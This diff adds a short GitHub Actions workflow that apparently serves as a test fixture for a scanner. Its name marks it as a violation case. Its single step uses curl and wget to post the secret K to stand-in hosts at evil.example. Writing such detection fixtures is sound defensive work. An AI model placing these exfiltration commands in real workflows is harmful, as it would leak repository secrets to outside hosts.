@@ -1,0 +1,9 @@
+name: violation_positional_after_valueless_flags
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -sSfL curl.evil.example -d "k=${{ secrets.K }}"
+          wget -q wget.evil.example --post-data "k=${{ secrets.K }}"
